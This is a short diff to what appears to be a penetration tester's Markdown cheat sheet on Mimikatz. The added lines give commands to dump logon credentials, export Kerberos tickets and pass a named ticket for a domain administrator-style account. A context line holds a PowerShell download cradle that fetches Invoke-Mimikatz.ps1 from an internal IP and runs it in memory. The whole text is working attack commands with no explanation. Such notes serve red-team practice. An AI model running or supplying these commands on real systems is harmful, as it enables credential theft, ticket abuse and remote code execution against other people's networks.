@@ -1,4 +1,18 @@
 # Mimikatz
+## Useful commands
+List all available provider credentials
+```
+sekurlsa::logonpasswords
+```
+
+```
+sekurlsa::tickets export
+```
+NOTE: Below PTT using an exported ticket
+```
+kerberos::ptt [0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
+```
+
 ## PowerShell Download Cradle
 ```
 [security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
